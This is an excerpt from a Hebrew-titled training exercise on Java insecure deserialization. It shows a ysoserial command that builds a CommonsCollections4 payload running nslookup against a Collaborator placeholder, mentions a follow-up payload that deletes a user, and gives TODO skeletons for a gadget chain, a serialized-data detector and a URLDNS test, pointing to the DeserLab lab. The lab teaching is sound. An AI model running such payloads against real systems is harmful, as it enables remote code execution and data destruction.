...
## תרגיל 4 - injection אובייקט שרירותי
...
```bash
# Create a payload that performs a DNS lookup (for detection)
java -jar ysoserial-all.jar CommonsCollections4 "nslookup YOUR-SUBDOMAIN.burpcollaborator.net" | base64

# After confirming it works - a payload that deletes the user
...
public class CustomExploit {
    public static void main(String[] args) throws Exception {
        // TODO: build the Gadget chain
        // Each class in the chain must be Serializable
...
# Magic bytes of Java serialization
JAVA_MAGIC = b'\xac\xed\x00\x05'
JAVA_MAGIC_B64 = 'rO0AB'

def check_parameter(value):
    """Check whether a parameter value contains serialized data"""
    # TODO: check:
    # 1. Whether it starts with rO0AB (Base64 of Java magic bytes)
    # 2. Whether after Base64 decode it starts with AC ED 00 05
    # 3. Whether it looks like PHP serialized (O:4:"User":...)
    # 4. Whether it looks like .NET ViewState
    pass

def scan_request(method, url, headers, body):
    """Scan an HTTP request to detect deserialization"""
    findings = []
...
def test_deserialization(url, param, method="GET"):
    """Attempt exploitation with a URLDNS payload"""
    # TODO:
    # 1. Create a URLDNS payload with ysoserial
    # 2. Send it in the vulnerable parameter
    # 3. Check in the Collaborator whether a DNS request arrived
    pass
```
...
```bash
# Run DeserLab - a dedicated deserialization lab
